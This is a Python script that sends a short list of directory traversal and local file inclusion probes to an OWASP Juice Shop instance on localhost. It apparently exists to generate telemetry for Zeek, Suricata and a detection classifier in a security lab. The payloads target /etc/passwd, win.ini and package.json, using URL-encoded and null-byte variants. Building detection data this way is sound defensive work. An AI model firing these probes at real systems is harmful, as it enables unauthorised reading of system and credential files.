#!/usr/bin/env python3
"""
Controlled Directory Path Traversal & LFI Scenario against OWASP Juice Shop.
Executes standard directory traversal sequences against static asset and FTP endpoints.
Observed by: Zeek (http.log dot-dot-slash patterns), Suricata
Detected by: Spark Structured Streaming & Web Exploitation Classifier
"""

import os
import time
import requests

TARGET_HOST = os.getenv("TARGET_HOST", "localhost")
TARGET_PORT = int(os.getenv("TARGET_PORT", 3000))
BASE_URL = f"http://{TARGET_HOST}:{TARGET_PORT}"

TRAVERSAL_PATHS = [
    ("/ftp/../../etc/passwd", "UNIX Passwd Traversal Probe"),
    ("/ftp/..%2f..%2fetc/passwd", "URL-Encoded Dot-Dot-Slash Probe"),
    ("/ftp/....//....//windows/win.ini", "Windows System File Traversal Probe"),
    ("/public/images/../../package.json", "Node.js Package Manifest Traversal Probe"),
    ("/ftp/coupons_2013.md.bak%2500.md", "Null-Byte String Termination Probe")
]

def run_path_traversal(delay: float = 0.2):
    print(f"\n[!] INITIATING CONTROLLED DIRECTORY PATH TRAVERSAL PROBE against {BASE_URL}...")
    headers = {
        "User-Agent": "Mozilla/5.0 (Directory-Traversal-Audit/2.0)"
    }
    
    probed = 0
    for idx, (path, desc) in enumerate(TRAVERSAL_PATHS):
        url = f"{BASE_URL}{path}"
        try:
            r = requests.get(url, headers=headers, timeout=2.0)
            probed += 1
            print(f"  [{idx+1}/{len(TRAVERSAL_PATHS)}] GET {path:36} -> HTTP {r.status_code} [{desc}]")
        except Exception as e:
            print(f"  [{idx+1}/{len(TRAVERSAL_PATHS)}] Traversal probe error: {e}")
        time.sleep(delay)
        
    print(f"[+] Path traversal sequence completed: {probed} vectors audited.")
    print(f"[*] Telemetry emitted into Zeek http.log & Suricata for directory traversal classification.")
    return probed

if __name__ == "__main__":
    run_path_traversal()
